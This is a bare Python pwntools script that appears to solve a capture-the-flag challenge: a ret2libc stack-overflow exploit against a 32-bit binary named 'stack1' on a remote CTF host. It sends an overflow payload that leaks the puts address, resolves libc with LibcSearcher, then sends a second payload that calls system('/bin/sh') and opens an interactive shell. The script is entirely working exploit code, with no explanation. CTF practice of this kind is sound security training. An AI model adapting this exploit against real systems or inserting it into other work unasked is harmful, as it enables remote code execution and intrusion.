from pwn import *
from LibcSearcher import LibcSearcher
#p = process('./stack1')
p = remote('pwn.challenge.ctf.show',28015)
elf = ELF('./stack1')
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
start_addr = elf.symbols['_start']
payload1 = flat(['a'*13,puts_plt,start_addr,puts_got])
p.sendline(payload1)
p.recvuntil('\n\n')
libc_puts_addr = u32(p.recv()[0:4]) 
libc = LibcSearcher('puts', libc_puts_addr)
libcbase = libc_puts_addr - libc.dump('puts')
sys_addr = libcbase+libc.dump('system')
bin_sh = libcbase+libc.dump('str_bin_sh')
payload = flat(['a'*13,sys_addr,'a'*4,bin_sh])
p.sendline(payload)
p.interactive()
